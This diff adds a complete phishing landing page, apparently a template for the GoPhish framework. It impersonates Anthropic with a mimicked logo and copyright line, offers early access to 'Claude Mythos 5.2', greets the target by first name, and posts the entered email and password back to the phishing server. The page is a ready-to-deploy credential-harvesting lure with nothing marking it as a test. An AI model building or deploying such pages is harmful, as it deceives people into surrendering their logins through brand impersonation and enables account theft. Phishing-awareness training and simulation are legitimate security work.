@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Claude Mythos 5.2 | Early Access</title>
+  
+  <!-- FAVICON BASE64 -->
+  <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+ip1sAAAAASUVORK5CYII=">
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Lora:ital,wght@0,400;0,600;1,400&family=Inter:wght@400;500;600;700;800&display=swap');
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: #f7f6f2;
+      color: #1a1a1a;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    body::before {
+      content: "";
+      position: absolute;
+      top: -20%;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 800px;
+      height: 800px;
+      background: radial-gradient(circle, rgba(217, 119, 87, 0.08) 0%, transparent 60%);
+      z-index: -1;
+      pointer-events: none;
+    }
+
+    /* --- HEADER LOGO PRESISI --- */
+    .brand-header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 40px;
+    }
+
+    .brand-text {
+      font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
+      font-size: 1.5rem; /* Ukuran teks disesuaikan */
+      font-weight: 800; 
+      color: #1a1a1a;
+      letter-spacing: 0.5px; 
+      line-height: 1;
+    }
+
+    /* Garis miring kustom (Custom Slash) */
+    .custom-slash {
+      display: inline-block;
+      width: 5px; /* Ketebalan garis */
+      height: 19px; /* Tinggi garis */
+      background-color: #1a1a1a;
+      transform: skewX(20deg); /* Positif agar miring ke kiri (\) */
+      margin: 0 4px; /* Jarak kiri-kanan yang konsisten */
+      vertical-align: -2px; /* Menurunkan garis agar sejajar dengan huruf */
+      border-radius: 1px;
+    }
+
+    /* --- KARTU UTAMA (LOGIN) --- */
+    .login-card {
+      background-color: #ffffff;
+      width: 100%;
+      max-width: 420px;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.04), 0 1px 2px rgba(0, 0, 0, 0.02);
+      border: 1px solid #e5e5e0;
+      text-align: center;
+    }
+
+    .badge {
+      display: inline-block;
+      background-color: #fff5f2;
+      color: #d97757;
+      font-size: 0.75rem;
+      font-weight: 600;
+      padding: 6px 12px;
+      border-radius: 20px;
+      margin-bottom: 20px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      border: 1px solid #fadcd4;
+    }
+
+    h1 {
+      font-family: 'Lora', serif;
+      font-size: 1.8rem;
+      color: #1a1a1a;
+      font-weight: 600;
+      margin-bottom: 12px;
+      line-height: 1.3;
+    }
+
+    .subtext {
+      font-size: 0.95rem;
+      color: #666;
+      margin-bottom: 30px;
+      line-height: 1.5;
+    }
+
+    .subtext strong {
+      color: #1a1a1a;
+    }
+
+    /* --- FORM INPUT --- */
+    .form-group {
+      margin-bottom: 16px;
+      text-align: left;
+    }
+
+    label {
+      display: block;
+      font-size: 0.85rem;
+      font-weight: 500;
+      color: #333;
+      margin-bottom: 6px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1px solid #d1d1cc;
+      border-radius: 6px;
+      font-size: 0.95rem;
+      color: #1a1a1a;
+      background-color: #fafafa;
+      outline: none;
+      transition: all 0.2s ease;
+      font-family: 'Inter', sans-serif;
+    }
+
+    input::placeholder {
+      color: #999;
+    }
+
+    input:focus {
+      border-color: #d97757;
+      background-color: #ffffff;
+      box-shadow: 0 0 0 3px rgba(217, 119, 87, 0.15);
+    }
+
+    /* --- TOMBOL SUBMIT --- */
+    .btn-submit {
+      background-color: #1a1a1a;
+      color: white;
+      border: none;
+      width: 100%;
+      padding: 14px;
+      font-size: 1rem;
+      font-weight: 500;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: background-color 0.2s;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .btn-submit:hover {
+      background-color: #333333;
+    }
+
+    /* --- FOOTER LINK --- */
+    .login-footer {
+      margin-top: 25px;
+      font-size: 0.85rem;
+      color: #666;
+    }
+
+    .login-footer a {
+      color: #d97757;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .login-footer a:hover {
+      text-decoration: underline;
+    }
+
+    .disclaimer {
+      font-size: 0.75rem;
+      color: #999;
+      text-align: center;
+      max-width: 400px;
+      margin-top: 30px;
+      line-height: 1.4;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER LOGO (Teks dengan Garis Miring Kustom) -->
+  <div class="brand-header">
+    <div class="brand-text">
+      ANTHROP<span class="custom-slash"></span>C
+    </div>
+  </div>
+
+  <!-- Kartu Login -->
+  <div class="login-card">
+    
+    <div class="badge">Early Access</div>
+
+    <h1>You're in early access.</h1>
+    
+    <p class="subtext">Welcome, <strong>{{.FirstName}}</strong>. You have been granted exclusive access to <strong>Claude Mythos 5.2</strong>. Sign in to your account to begin testing the new capabilities.</p>
+
+    <!-- Form GoPhish -->
+    <form action="" method="POST">
+      <div class="form-group">
+        <label>Email address</label>
+        <input type="email" name="username" placeholder="name@company.com" required>
+      </div>
+      
+      <div class="form-group">
+        <label>Password</label>
+        <input type="password" name="password" placeholder="Enter your password" required>
+      </div>
+      
+      <button type="submit" class="btn-submit">
+        Access Claude Mythos
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+      </button>
+    </form>
+
+    <div class="login-footer">
+      Don't have an account? <a href="#">Request access</a>
+    </div>
+
+  </div>
+
+  <div class="disclaimer">
+    © 2026 Anthropic PBC.
+  </div>
+
+</body>
+</html>
